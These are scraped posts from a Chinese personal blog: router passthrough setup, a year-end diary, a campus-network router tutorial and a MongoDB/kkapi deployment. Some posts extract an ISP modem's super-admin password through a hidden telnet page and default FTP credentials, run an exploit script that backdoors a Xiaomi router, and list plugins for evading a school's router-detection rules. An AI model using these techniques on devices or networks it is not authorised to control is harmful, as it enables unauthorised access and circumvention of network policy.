GRUB_CMDLINE_LINUX_DEFAULT=\u0026#34;quiet amd_iommu=on iommu=pt\u0026#34; 注意参数之间的空格，修改之后保存退出，执行指令 update-grub 更新一下引导程序，出现 done字样就算成功。\n增加模块 接下来增加一些模块，修改 /etc/modules文件，添加#号下面的几个模块。\n1 2 3 4 5 6 7 8 9 # /etc/modules: kernel modules to load at boot time. # # This file contains the names of kernel modules that should be loaded # at boot time, one per line. Lines beginning with \u0026#34;#\u0026#34; are ignored. vfio vfio_iommu_type1 vfio_pci vfio_virqfd 然后执行指令 update-initramfs -u -k all 对模块的升级。没有出现 Error 字样就算成功了，之后 reboot 重启一下。\n结束 这一篇就先写到 PVE 的安装和配置直通，下一篇打算写自己经历的固件的选择和安装。软路由老早就装好了，当时也没截图凭借一些其他的教程写了自己的经过，自己挖的坑一定要填上！\n","date":"2023-02-03T00:00:00Z","permalink":"https://www.braindance.top/articles/2023/02/%E8%BD%AF%E8%B7%AF%E7%94%B1%E6%97%A5%E8%AE%B0%E4%B8%80/","title":"软路由日记(一)"},{"content":"折腾软路由百忙之中抽时间来简单水一篇。\n有这个需求是因为目前在家里是用另一个无线路由器桥接联通的光猫的，但是在dhcp 里死活找不到桥接路由器分配的 ip，然后插上软路由竟然又把 ip 分配给软路由了，真是不服不行。\n之前装联通宽带的时候尝试过找师傅要超级管理员的密码，但是师傅给我打哈哈糊弄过去了，给的一个普通 user 用户并没有静态 ip 的权限，所以就去网上找教程了，自己记录一下。\n原文地址：https://www.right.com.cn/forum/thread-8253868-1-1.html\n设备型号 SK-D748-C\n第一步 保证可以局域网内正常访问联通光猫的管理界面。比如我的光猫地址为 192.168.1.1\n第二步 打开隐藏配置界面：http://192.168.1.1/hidden_version_switch.html\n勾选图中的 Telnet Enable 选项，网页会刷新一下，接下来测试一下光猫的 telent 是否成功打开。\n开始 - 运行 - cmd，运行 telnet 192.168.1.1 提示输入登陆用户名称视为成功。\n第三步 使用 ftp 连接光猫，默认的账号密码是 useradmin/useradmin ，在 /var/tmp 目录下的 telnet_su_passwd 文件就是管理员密码。\n我最后获得的密码格式是：前半段是光猫默认的 wifi 密码，从 CUAdmin 开始到后面一串数字是超级管理员的登陆密码\n超级管理员用户名是 CUAdmin\n其他说明 不要尝试在 ftp 里随意删除软件，可能导致设备异常 获取超级管理员权限后，修改任何设置前自行评估有无风险。 ","date":"2023-01-04T00:00:00Z","permalink":"https://www.braindance.top/articles/2023/01/%E4%B8%AD%E5%9B%BD%E8%81%94%E9%80%9Ask-d748%E5%85%89%E7%8C%AB%E8%B6%85%E7%BA%A7%E5%AF%86%E7%A0%81%E8%8E%B7%E5%8F%96/","title":"中国联通SK-D748光猫超级密码获取"},{"content":"今年过得可真是太快了，不知道从哪开始写。前几天不小心点开微博，首页一句话想想只能苦笑一下，所有人应该都过得差不多吧。今年我乱过的，明年我一定好好过。\n学业 可能到现在也不知道当时为了什么考研，可能就是觉得听了大环境下找工作不容易，自己觉得在本科学校体验不太好，想上个像样的大学，考前一阵子还记得说过：XXX（自己学校）狗都不来，现在调剂回本校了，到考前一天所有的书可能连一遍都没过完，数学只能说本科那几门都没整明白。本来目标也没多高，到调剂的时候一降再降，算了，有学上就行不挑了。\n现在只要是个计算机专业研究生基本上都逃不过人工智能的大门，无论是什么方向都会往上面靠，可能这就是大势所趋吧，我反正只能提起半个兴趣，也许我对所有东西都只能提起半个兴趣。人工智能又是和数学挺有关联的，自己考研数学都没整好，现在学的一门人工智能数学真的是边看边摇头。出来混迟早要还的。\n然后学校的培养计划是学硕专硕都要发文章，本来自己的表达能力都不太行，又想了想自己本科的毕业设计论文，既来之则安之吧。\n新冠疫情 好像就是今年年初的时候开开始全员核酸，然后大四最后在学校基本上过两天就要下去排个队，然后学校组织的又不行，基本上一下去就要一个半小时在那站着，所以我基本上都是踩着尾去的。今年过得如此的快跟这个全员核酸和封闭逃不了干系，天天坐在屋子里面，一晃一天过去了，天天就跟乌龟一样都没动过，自己也没怎么运动过。\n然后年底阵子封控放开了，家里亲戚和认识的人基本都阳了个遍，我在家发烧了两波，刚好还都是在线上考试之后，有一晚上真是烧的顶不住了，半夜起来手机放旁边听歌还觉得好受了点，写这篇总结的时候已经差不多完全好了。就这样吧，反正也放开了，以后说不定就再也没有新冠疫情导致各种封闭了，在后头的好日子应该快来了吧啊？\n家人 之前还会担心爸妈会在我不在家的时候家里闹矛盾什么的，现在感觉爸妈快退休了还是心态变了，现在俩人也会吵就是很快就笑了，这样子我在学校的时候也不会太担心了，总之确实跟之前也有很大的变化，希望身体都健健康康的就好。\n我姐年底的时候出国读博了，就如我姐之前说的她是真的惨，从幼儿园开始连着上了 30 年学，不过这应该也就是最后了，以她的专业，只要能顺利毕业接下来真就是好日子了。\n毕业 现在想想有点怀念本科最后做毕设那会，事也不算多，和其他的好几个宿舍天天都有联动活动，有点想起来小时候跟发小在外面疯一样，那种感觉真的是久违了。宿舍里两个去工作了，剩下三个考研只有我姑且算是考上了，但是我感觉他们每一个都比我努力的多，今年也都二战了，在这里祝他们都成功上岸吧，以后各自也都有自己的路要走了，这一次分别谁知道一下次会在哪见面，各位天山路远，山高水长，后会有期，江湖再见。\n感情 算是失败过一次吧，但是也不算，反正现在性格小开阔一下，至少不像之前那样跟没见过女人一样 (😎👉😭🕶️) 年纪也快到了，爸妈开始正式跟我说这个问题了，之前从来都是闭口不谈，还声称我谈恋爱给我恋爱经费，但是我一个臭打游戏的，买个游戏都要蹲打折才行，这一点也得改一改。然后就是确实有点不懂人情世故，我要是女的我都觉得这个人看起来不太聪明有点妈宝的感觉。以后一个一个改吧，不然真就是相亲硬过日子了，感觉自己也是条件不咋地要求还挺高，到现在也没遇到真能豁出去的，自己也要胆大一些。\n自己的想法 昨天晚上高中同学回来了，一起遛弯聊了聊，他对他现在的工作挺不满意的想换了，想了下我再过两年就也该找工作了，但是天天只顾得上自己学和玩，除了程序员这一条路，其他能干啥也不知道，等到时候年纪大了被顶掉了咋办？确实想太多也会让步伐变慢，带着这个问题等遇到新信息再想吧。我也又一次确认了一下自己努力的目标就是为了到将来的时候能过得轻松点就很满足了。\n最近几个月买了个软路由，还应验了之前一篇文章里写的，过年别人在出去吃喝，我在家里折腾黑盒子，问我收获了什么，就是组了一个 all in one 看视频不要广告 blablabla，自己随地就可以魔法，父母只是沉默不语，看着自己家的电表转的又快了。哈哈哈\n自从从去年7 8月份加入了实验室吧，我就每天把自己安排的满满当当，从早上到晚上每一件事都用尽全力，不管是打游戏还是去学习和折腾些技术，感觉一点其他的时间都没有给自己留，一直都是火力全开往前走也没有停下来好好想一想，前几天在电视上也看到了一个广告，一个老奶奶教自己孙女画画说道：“画画要留白，人生也一样，不要把生活填得太满，多给自己留些空间”。也觉得这样排的满满当当自己有点吃不消了，而且好多东西也有点力不从心，开始变得有些木讷了，明年就先学学会劳逸结合，但是效率还是不能丢。\n现在是 22年12月31日23点25分，赶在这一年的最后把总结写出来了，就这样吧，今年确实过得听梦幻的，最近这三年都听梦幻的，翻了一遍相册也是没有什么大事可回忆的，平平淡淡也挺好的吧。\n再见 2022 ！\n","date":"2022-12-31T00:00:00Z","permalink":"https://www.braindance.top/articles/2022/12/2022%E5%B9%B4%E5%BA%A6%E6%80%BB%E7%BB%93/","title":"2022年度总结"},{"content":"前言 我们学校的校园网不光每个月要宽带费 20/月，而且要绑定一个校园卡，我的一个月月租下来要 49/月，而且校园网还限制设备数量只能连接一个，我一般都是电脑连校园网，手机用流量，但是教职工的校园网就可以两个设备连接，寝室里目前有6+个设备也需要联网，商量以后打算搞个路由器贡献一个账号连校园网开 wifi，之前就见贴吧有老哥已经成功了，所以自己也尝试一下做个记录，给以后的同学看也不错。由于我已经连好路由器了，所以部分图片取自网络图片作为参考，我也尽量说的详细些。\n对于任何硬件、软件的损坏，本人没有赔偿的责任，哪怕这样的后果是因教程中的错误造成的。也请认真对待每一步操作，也许因为你的操作不当硬件因此变成一块砖。另外本教程的操作会使你的路由器失去保修。 本篇文章仅起指导性的作用，在操作的过程中遇到的问题也许我也没有遇到过，请先自行尝试解决，如果我有空也会尽量帮助。 学校明令禁止安装路由器，本人绝对没有怂恿或建议任何同学安装路由器，本人安装路由器的行为完全属于个人意志，仅仅作为个人的学习技术交流，请读者在安装好路由器之后 24 小时内再将之拆除，请按照学校指明的方式连接到互联网。如果学校根据校规等文件追究责任，与本人无关。 叠甲过\n前置知识 校园网插入网线认证是要模拟 Dr.com 软件的发包认证，除了账号密码认证校园网以外，软件还会定时发送心跳包保证校园网连接。\nzut 的校园网认证格式为账号：\\r\\n你的学号@[unicom|telecom|cmcc] ，其中 @ 后面的是你的运营商，对照前面的格式分别为：联通、电信、移动，例如我的是联通校园网，账号就是：\\r\\n2022********@unicom，密码就是你自己的密码。\nzut 校园网的客户端版本为：6.0.0（P）\n校园网的防检测插件原理还没有写，自己用的 小米4C 是社区固件资源中自带的。想看原理可以看最后挖坑部分\n需要的材料 本教程使用的路由器型号 Xiaomi router 4c pdd二手35，安装的系统 openwrt。请注意：路由器的选择直接影响到你后面的操作，我专门在网上挑了好久选的这个路由器，但是，唯独这个路由器的社区资源最特殊，本人也是经过各种尝试才成功。如果选择其他路由器，本教程中的主要安装思路相同，但是需要自行寻找适合自己路由器的固件资源。\n路由器。 网线两根。一根我买的8m的，因为宿舍AP在门上面，另一根需要连接路由器和电脑，长度自己看。 开通校园网的账号。 自己思考的能力。 需要的软件压缩包：zut_Xiaomi_router_4c.zip。其中包含 dogcom.zip。用来进行校园网模拟拨号，定时发送心跳包的工具。 R3GV2 patches.zip。刷机的主要部分包含了：R3GV2 patches（前期连接路由器的工具）、Mi4C.bin（小米 4c 的 openwrt 固件自带防检测插件）、breed.bin（breed web 恢复控制台） MobaXterm_Portable.zip。用来连接路由器和传输文件的软件 小米路由器4C恢复官方固件工具包.zip。刷成砖的官方补救措施 教程参考的网站或资料 贴吧老哥的教程：https://tieba.baidu.com/p/7760362347 广东工业大学在 github 上的教程：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt 【记录】小米路由器 4C 刷机过程：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt/issues/27 R4CM，说说我的小米路由器4C刷机过程：不用Linux也不用虚拟机…… ：https://www.right.com.cn/FORUM/thread-4047571-1-1.html 路由器认证校园网drcom：https://www.brothereye.cn/router/669/ 开工 接通路由器电源，使用网线连接路由器，进入初始化管理页面通常是 192.168.1.1，能跳过就跳过，下图右选择无需拨号即可。（网络图片仅供参考）\n接下来设置 wifi 名称和密码，可以勾选管理密码和 wifi 密码相同的框，保存以后会提示新的管理后台地址，通常是 192.168.31.1，使用管理密码登陆以后，显示路由器界面就算初始化成功。\n刷入不死 Breed Breed 是国内个人 hackpascal 开发的闭源 Bootloader（引导加载器，即为用于加载操作系统的程序），也被称为“不死鸟”。 因为有些官方升级固件自带 bootloader，如果从官方固件升级，会导致现有 bootloader 被覆盖。而当 Breed 更新固件时，它会自动删除固件附带的引导加载程序，因此可以防止 Breed 被覆盖。\n刷入 Breed 的作用就是为后面刷固件做个保险，失败以后可以进行 reset 复位，防止路由器刷成一块砖。\n开启路由器 telnet 和 ftp 打开前面下载的压缩包中的 R3GV2 patches 文件夹，运行其中的 0.start_main.bat，这个批处理的命令主要是运行了文件夹中的 main.py ，而 main.py 做的事情就是尝试发现你的路由器后台地址，然后需要输入管理后台的密码，然后执行一些 exploit 在路由器中写入后门，界面中出现 Done 字样就算成功。\n这里遇到过扫描不到管理后台的情况，如果遇到了可以参考以下步骤。修改 main.py 文件中的第 10 行到 15 行，删掉\n1 2 3 4 5 6 line4 = subprocess.check_output([\u0026#34;cmd\u0026#34;,\u0026#34;/c\u0026#34;,\u0026#34;chcp\u0026#34;,\u0026#34;437\u0026#34;,\u0026#34;\u0026amp;\u0026#34;,\u0026#34;tracert\u0026#34;,\u0026#34;-d\u0026#34;,\u0026#34;-h\u0026#34;,\u0026#34;1\u0026#34;,\u0026#34;1.1.1.1\u0026#34;]).decode().split(\u0026#34;\\r\\n\u0026#34;)[4].strip().split(\u0026#34; \u0026#34;) for data in line4: if len(data.split(\u0026#34;.\u0026#34;)) == 4: router_ip_address = data break 添加 router_ip_address 变量为你的管理后台地址，通常为 192.168.31.1\n1 router_ip_address = \u0026#39;192.168.31.1\u0026#39; 接下来使用 MobaXterm 连接路由器，新建一个 session 类型选择 telnet，这时的路由器地址就是管理后台的地址应该是 192.168.31.1，用户为 root。\nps：如果连接不成功就多运行几次 0.start_main.bat。\n备份原路由器信息 以下步骤请注意！！！ 最好备份以下路由器原本分区文件，以防不备之需，其中eeprom.bin 是最重要的，因为刷入 breed 以后可能会导致 MAC 地址全 0，需要刷入一次这个文件才会恢复。执行以下命令，of 后面的就是文件输出的路径\n1 2 3 dd if=/dev/mtd0 of=/tmp/all.bin dd if=/dev/mtd2 of=/tmp/bootloader.bin dd if=/dev/mtd3 of=/tmp/eeprom.bin 打开电脑资源管理器，输入 ftp://192.168.31.1 按回车，使用 ftp 连接路由器（为什么不用 MobaXterm，因为后门创建的 ftp 是匿名用户，直接使用 windows 资源管理器打开更方便）\n找到 tmp 文件夹其中的三个文件：all.bin 、bootloader.bin 和 eeprom.bin，复制到本地做备份，下载以后一定要看清楚三个文件的大小分别是 16MB 、64k 和 64k，如果大小是 1k 那就是错误的，再备份几次，也有可能是后门没写牢再执行 0.start_main.bat 试试。\n上传 Breed 文件并刷入 在资源管理器的 ftp 中把 breed.bin 文件上传到 /tmp 文件夹下，在 telnet 中执行指令刷入引导加载器\n1 mtd write /tmp/breed.bin Bootloader 不提示错误信息就是刷入成功了。\n重启路由器进入 Breed 拔掉路由器电源，用一根牙签类似的东西，插入路由器后面的 reset 孔不要松开，再插上电源，路由器灯会先闪一下，直到连续闪烁几次以后再松开 reset，这时路由器已经进入 breed 了，打开浏览器访问 192.168.1.1 就可以看到 Breed 的界面（网络图片仅供参考，系统信息可能不一样）\n如果你在之后有不可挽回的错误操作，都可以通过以上操作进行复位重置。\n检查 MAC 地址 进入 MAC 地址修改，通常你应该看到的前三个 MAC 地址应该是全0，这就需要刷入 一次之前的 eeprom.bin。（网络图片仅供参考）\n进入固件更新 （界面同下面），勾选 EEPORM，选择文件 eeprom.bin，其他的都不要动，然后上传，根据提示更新，之后会重新回到 Breed 控制台。\n刷入 openwrt 同样在 Breed 控制台选择固件更新 ，勾选固件，选择 Mi4C.bin openwrt 固件文件，根据提示上传安装。（网络图片仅供参考）\n之后路由器灯会全灭，然后电源灯进入黄色闪烁的状态，就是正在安装，等待安装成功以后等会变成蓝色，之后就可以访问 192.168.1.1 进入openwrt 管理后台页面，默认密码为 password 。\n说一下 Mi4C.bin 这个openw 的固件。这个固件来自前面提到的广东工业大学项目中的 issue，是一位同学自己找人定制的一份固件并且免费分享出来了，其中已经内置了 Dr.com 插件（用来发送心跳包）及防检测插件（ttl，ipid，cookieflash，ua2f 最新版），非常感谢这位同学的分享。\n配置 PPPoE 拨号 前置条件：宿舍上面的AP接口插入路由器的 WAN 口\n选择 网络 \u0026mdash;\u0026gt; 接口，点击 WAN 接口对应的 编辑（Edit）按钮。\n下面图中是我的已经配置好的界面，初次进入应该是有个 WAN 和 WAN6 接口，它们两个的下面并不是我图中的 pppoe-wan，应该是 eht0.2。WAN6 接口是一个 DHCP IPV6 客户端，它和 WAN 接口是同一个物理接口，留着也不影响 。LAN 口尽量不要动。\n通信协议选择 PPPoE 然后点击出现的切换协议按钮。然后根据下表填入信息\nPAP/CHAP 用户名。校园网账号，前置知识中的\\r\\n****@***格式。 PAP/CHAP 密码。校园网密码。 其他的不用动，请仔细检查校园网账号和密码是否正确。之后点击保存退出后，点击界面右下角的保存并应用。\nPPPoE 部分配置完成。但是校园网目前还不能用。\n配置无线网络 选择 网络 \u0026mdash;\u0026gt; 无线，如果提示已禁用就点击启用，只有一个你可以点击编辑的按钮。ESSID 就是设备搜索到的无线网名称。网络是 LAN 接口就不用动。\n选择 无线安全 配置无线网密码，加密选择 WPA2-PSK\n无线网络部分配置完成。\n配置管理后台密码 192.168.1.1 管理后台默认密码 password 容易被进入，进入 系统 \u0026mdash;\u0026gt; 管理权，可以更改访问后台管理员的密码。\n校园网认证 前置条件：配置好 PPPoE 拨号\n在前面我们已经成功配置了 PPPoE 拨号，但是要记得校园网还要发送心跳包保证在线状态。这部分主要解决发送心跳包的问题。\n还需要说一下，发送心跳包的主要原理来自 drcom-generic 项目，广工大项目中使用的 Dr.com 插件是这个项目的 openwrt 插件版本，并且现在刷入的 openwrt 固件自带的也是这个插件，我并没用使用成功。最终是结合了学校贴吧老哥使用的 dogcom 才成功，dogcom 则是前面那个项目的 C 语言实现版本。\n删除 Dr.com 插件 在使用 dogcom 之前，需要把之前的 Dr.com 插件删除，因为会造成重复发包的问题导致无法认证。\n进入 系统 \u0026mdash;\u0026gt; 软件包，在界面中筛选器部分搜索 drcom 或者 gdut （记不清了），然后选择 已安装列表，搜索到的软件包点击移除按钮，自动移除未使用的依赖可以取消勾选。\n通过 openwrt 提供的 ssh 连接路由器 openwrt 安装成功以后其实就可以通过 ssh 连接路由器了，使用 MobaXterm 连接路由器。这时连接的地址是 192.168.1.1，用户名是 root，密码是你 openwrt 的管理后台密码\nMobaXterm 使用 ssh 连接以后左边会自己创建一个 ftp 连接，就是图中的框框部分\n上面蓝色选中的部分是当前的路径，可以修改当前所在路径，通过拖拽可以直接上传文件\n安装 dogcom dogcom 安装方式有两种， 一种是使用 openwrt 版本的通过 opkg 软件包管理器安装，另一种是通过 ftp 上传 dogcom 可执行文件到 /usr/bin/ 文件夹中。就算使用 opkg 软件包安装，两个最后的结果都是一样的，就是在 /usr/bin/ 文件夹中有一个 dogcom 的可执行文件。\n方法一：使用 opkg 软件包安装\n还是在系统 \u0026mdash;\u0026gt; 软件包界面，有一个上传软件包按钮，点击上传下载的压缩包 dogcom.zip 中的 dogcom_v1.6.2-1_mipsel_24kc.ipk，之后执行安装即可。\n也可以通过 ftp 把文件上传到 /tmp 文件夹中，然后在控制台执行\n1 opkg install /tmp/dogcom_v1.6.2-1_mipsel_24kc.ipk 方法二：通过 ssh 上传到指定目录 在左侧的 ftp 界面上面路径输入 /usr/bin 进入文件夹，然后拖动名为 dogcom 的文件上传到该目录。 通过以上方法两个方法上传安装 dogcom 以后，可以在控制台执行\n1 /usr/bin/dogcom -h 测试软件是否可用，软件输出为\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 root@iapp:~# /usr/bin/dogcom Drcom-generic implementation in C. Version: 1.6.2 Usage: dogcom -m \u0026lt;dhcp/pppoe\u0026gt; -c \u0026lt;FILEPATH\u0026gt; [options \u0026lt;argument\u0026gt;]... Options: --mode \u0026lt;dhcp/pppoe\u0026gt;, -m \u0026lt;dhcp/pppoe\u0026gt; set your dogcom mode --conf \u0026lt;FILEPATH\u0026gt;, -c \u0026lt;FILEPATH\u0026gt; import configuration file --bindip \u0026lt;IPADDR\u0026gt;, -b \u0026lt;IPADDR\u0026gt; bind your ip address(default is 0.0.0.0) --log \u0026lt;LOGPATH\u0026gt;, -l \u0026lt;LOGPATH\u0026gt; specify log file --daemon, -d set daemon flag --802.1x, -x enable 802.1x --eternal, -e set eternal flag --verbose, -v set verbose flag --help, -h display this help 视为成功。\n上传 dogcom 配置文件 可以参考上一节安装 dogcom 的方法二，使用 ftp 上传 dogcom.conf 文件到 /usr/ 目录下。这个 dogcom.conf 内容是发送心跳包的配置文件，来源是通过 drcom-generic 项目教程，使用 Wireshark 软件进行抓包并使用 在线配置器 获得的，如果以后校园网配置更改还需要自行抓包测试。dogcom.conf 的内容如下\n1 2 3 server = \u0026#39;1.1.1.1\u0026#39; pppoe_flag = \u0026#39;\\x2f\u0026#39; keep_alive2_flag = \u0026#39;\\xdb\u0026#39; 配置 PPPoE 拨号文件 在 ssh 中按照顺序执行以下指令，这一步十分的重要！！！：\n1 2 3 4 cp /lib/netifd/proto/ppp.sh /lib/netifd/proto/ppp.sh_bak sed -i \u0026#39;/proto_run_command/i username=`echo -e \u0026#34;$username\u0026#34;`\u0026#39; /lib/netifd/proto/ppp.sh sed -i \u0026#39;/proto_run_command/i password=`echo -e \u0026#34;$password\u0026#34;`\u0026#39; /lib/netifd/proto/ppp.sh chmod 777 /usr/bin/dogcom 之后就可以执行\n1 /usr/bin/dogcom -m pppoe -c /usr/drcom.conf -e -d \u0026amp; dogcom 会自动启用一个守护进程发送心跳包认证，为了保证每次路由器重启以后自动连接校园网并认证，建议在 openwrt 管理页面的 系统 \u0026mdash;\u0026gt; 计划任务 中添加本地启动脚本\n1 sleep 10 \u0026amp;\u0026amp; /usr/bin/dogcom -m pppoe -c /usr/drcom.conf -e -d \u0026amp; 查看校园网是否成功认证 配置完成后，重启路由器，并请耐心等待若干分钟（3分钟内），重新回到 openwrt 管理页面的 网络 \u0026mdash;\u0026gt; 接口中，查看 WAN 接口 PPPoE 是否拨号成功，如果运行时间、发送、接受均有数据，并且 IPv4 获得的一个地址，则说明路由器已经可以上网了。\nwan中，学号密码输入错误。\n路由器的wan没有与校园网端口连接\n网线断了，或者路由器坏了\n压根没开通校园网\ndogcom 插件中，校园网心跳配置已经更改\n端口被学校网络中心拉黑了\n挖个坑 校园网防检测 常见的四种检测：\n基于 IPv4 数据包包头内的 TTL 字段的检测（固定TTL） 基于 HTTP 数据包请求头内的 User-Agent 字段的检测(UA2F) DPI (Deep Packet Inspection) 深度包检测技术）（不常用） 基于 IPv4 数据包包头内的 Identification 字段的检测（rkp-ipid 设置 IPID） 基于网络协议栈时钟偏移的检测技术（防时钟偏移检测） Flash Cookie 检测技术（iptables 拒绝 AC 进行 Flash 检测 不常用） 大佬讲解文章：https://catalog.chn.moe/\n广东工业大学项目：https://github.com/shengqiangzhang/Drcom-GDUT-HC5661A-OpenWrt#步骤六配置防检测\n校园网经常掉线 2022.10.31 更新\n自己从网上找了一个检测断网并自动重新拨号的脚本，配合定时任务每天凌晨 4 点重启，已经用了 20 多天了感觉还不错，分享一波代码。可以在任意目录下创建一个 ping 文件夹（但是需要自己改下某些配置路径），下面的例子是在 /root/ping 目录里放的脚本。脚本包括产生的日志有三个文件：\nping.sh。每间隔 SLEEP_SEC 时间测试两个外网地址能否访问，超过 PING_SUM 次数无法访问判断为拨号掉线，重启 wan 口进行拨号。产生的日志文件存放到 /root/ping/log.txt daemon.sh。检测 ping.sh 进程是否存活，如果不存在进程则重启进程；判断日志文件超过 50MB 清空日志文件。 ping.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 #!/bin/sh PING_SUM=5 #ping interval SLEEP_SEC=10 #连续重启网卡 REBOOT_CNT 次网络都没有恢复正常，重启软路由 #时间= (SLEEP_SEC * PING_SUM + 20) * REBOOT_CNT REBOOT_CNT=30 LOG_PATH=\u0026#34;/root/ping/log.txt\u0026#34; cnt=0 reboot_cnt=0 while : do ping -c 1 -W 1 114.114.114.114 \u0026gt; /dev/null ret=$? ping -c 1 -W 1 223.6.6.6 \u0026gt; /dev/null ret2=$? if [[ $ret -eq 0 || $ret2 -eq 0 ]] then echo \u0026#39;Network OK!\u0026#39; cnt=0 reboot_cnt=0 else cnt=`expr $cnt + 1` echo -n `date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;` \u0026gt;\u0026gt; $LOG_PATH printf \u0026#39;-\u0026gt; [%d/%d] Network maybe disconnected,checking again after %d seconds!\\r\\n\u0026#39; $cnt $PING_SUM $SLEEP_SEC \u0026gt;\u0026gt; $LOG_PATH printf \u0026#39;-\u0026gt; [%d/%d] Network maybe disconnected,checking again after %d seconds!\\r\\n\u0026#39; $cnt $PING_SUM $SLEEP_SEC if [ $cnt == $PING_SUM ] then echo \u0026#39;ifup wan!!!\u0026#39; \u0026gt;\u0026gt; $LOG_PATH echo \u0026#39;ifup wan!!!\u0026#39; ifdown wan sleep 1 ifup wan cnt=0 #重连后，等待20秒再进行ping检测 sleep 20 #网卡重启超过指定次数还没恢复正常，重启软路由 reboot_cnt=`expr $reboot_cnt + 1` if [ $reboot_cnt == $REBOOT_CNT ] then echo -n `date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;` \u0026gt;\u0026gt; $LOG_PATH echo \u0026#39;-\u0026gt; =============== reboot!\u0026#39; \u0026gt;\u0026gt; $LOG_PATH echo \u0026#39;-\u0026gt; =============== reboot!\u0026#39; sshpass -p 132465 ssh -p 22 root@192.168.1.1 \u0026#39;reboot\u0026#39; fi fi fi sleep $SLEEP_SEC done daemon.sh\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 #!/bin/sh LOG_PATH=\u0026#34;/root/ping/log.txt\u0026#34; # 用ps获取ups进程数量 NUM=`ps | grep ping.sh | grep -v grep | wc -l` echo ${NUM} # 少于1，重启进程 if [ \u0026#34;${NUM}\u0026#34; -lt \u0026#34;1\u0026#34; ] then /root/ping/ping.sh \u0026gt; /dev/null \u0026amp; echo -n `date \u0026#39;+%Y-%m-%d %H:%M:%S\u0026#39;` \u0026gt;\u0026gt; $LOG_PATH echo \u0026#39;-\u0026gt; Ping daemon start\u0026#39; \u0026gt;\u0026gt; $LOG_PATH fi s=`du -k /root/ping/log.txt|awk \u0026#39;{print $1}\u0026#39;` if [ $s -gt 500000 ] then chengdatetime=`date \u0026#34;+%Y-%m-%d %H:%M:%S\u0026#34;` echo $chengdatetime\u0026#34;:log size is large than expected and cleaning is started\u0026#34; \u0026gt;\u0026gt; $LOG_PATH cat /dev/null \u0026gt; /root/ping/log.txt fi exit 0 之后在 openwrt 的管理后台 \u0026mdash;\u0026gt; 系统 \u0026mdash;\u0026gt; 计划任务中添加\n1 2 0 4 * * * reboot 0 */1 * * * /root/ping/daemon.sh 第一行是每天 4 点重启路由器，第二行是启动检测存活脚本（看好文件路径别错），可以自行设置计划运行时间。\n分割线，以下是旧内容\n这个我也遇到过了，不知道是什么原因，毕竟我自己用电脑连着认证时不时也会掉，但是也有搜到的下面的办法\nhttps://blog.csdn.net/weixin_35251837/article/details/119553540\n在 /etc/ppp/options 文件中添加 persist\n完工 读到这里相信你也费了好大的力气了，也恭喜你，至少你是一个善于坚持的人，请享用你的校园网吧。有问题可以在评论区提问。\n","date":"2022-10-11T00:00:00Z","permalink":"https://www.braindance.top/articles/2022/10/zut-%E4%BD%BF%E7%94%A8%E8%B7%AF%E7%94%B1%E5%99%A8%E8%BF%9E%E6%8E%A5%E6%A0%A1%E5%9B%AD%E7%BD%91/","title":"ZUT 使用路由器连接校园网"},{"content":"前言 感觉原来的 Artitalk 说说不好康，在开往里发现好多博客都用的说说功能叫叨叨点啥，看了看作者的说说页面，可以插入图片和标签分类，还有仅自己可见的功能，感觉挺不错的（实际是自己想折腾）所以就整一个。自己在部署过程中实在是踩了不少的坑，而且作者的文档感觉写的也不算完善，所以打算自己记录一下。\n项目结构 作者的文档中各种仓库链接属实给我跳晕了，最后理出来的项目分为以下部分：\nkkapi。是作为说说的后端部分，连接 MongoDB 数据库，还有一个kkadmin的管理页面 ISpeak。说说的主体部分，依赖于后端的 kkapi ，分为前端的展示页面，和一个对接后端的发布说说页面。 作者文档中给出很多部署方法，白嫖版的就是 vercel 后端 api + 管理界面 + MongoDB 提供的云服务，但是个人感觉 vercel 经常被墙，所以部署的 api 感觉也不会稳定，而且考虑到数据的存放问题，所以我选择的是都部署到自己服务器上。\n后端部署 Docker 安装 Mongodb 安装可以参考菜鸟教程的 Docker 安装 MongoDB 。因为之前听过 MongoDB 的未授权访问，所以考虑到安全性问题，创建容器的时候添加 MONGO_INITDB_ROOT_USERNAME 和 MONGO_INITDB_ROOT_PASSWORD 设置用户的账号密码，开启Docker MongoDB 的身份验证。考虑到数据未来的迁移可以通过 -v 挂载宿主机的一个目录。可以修改默认端口再减少一些风险。最后我启动的命令如下\n1 2 3 4 5 6 7 docker run -d --name mongodb \\ -p xxxxx:27017 \\ -v /my/own/datadir:/data/db \\ -e MONGO_INITDB_ROOT_USERNAME=mongoadmin \\ -e MONGO_INITDB_ROOT_PASSWORD=secret \\ --restart=always mongo 之后可以使用工具测试一下连接。\nkkapi 部署 和项目文档中的教程差不多，要注意使用的 node 版本请高于 16.0.0\n首先克隆项目源码 git clone https://ghproxy.com/https://github.com/kkfive/kkapi-open.git 接下来项目需要安装的工具 yarn 和 pm2，分别是 npm i yarn -g npm i pm2 -g 然后安装项目所需依赖 yarn install 。 之后再执行 yarn build 编译项目。这里我的小鸡顶不住编译所以自己在本地编译传上去了💧。 在项目文件夹创建环境变量文件，格式如 1 2 3 4 5 6 PORT=3000 DATABASE_URL=mongodb://127.0.0.1:27017/kkpaiopen?authSource=admin DATABASE_USER=mongoadmin DATABASE_PASSWORD=secret # 加密密钥 测试 SECRETKEY=xxxxxxxxxxxxxxx 这里的数据库连接地址我原来还想使用MongoDB提供的免费云服务当数据库，但是没搞成功，所以最后使用了本地的 MongoDB，有大佬知道的可以指点一下。\n使用 pm2 使用守护线程启动项目 pm2 start pm2.json 我启动项目遇到了 [PM2][WARN] Expect “restart_delay” to be a typeof [object Number], but now is [object String] 错误，这个错误原因是作者的 pm2.json 中的 restart_delay 值是字符串类型 60s 改成数值 60 就可以了。\n测试项目是否成功启动 可以使用 lsof -i:端口 查看端口是否被监听判断项目是否成功启动。没成功的原因大概率是因为数据库连接地址、数据库账号密码不正确。\n创建初始化用户 curl http://127.0.0.1:3000/api/user/init 创建的默认用户名和密码是 admin 和 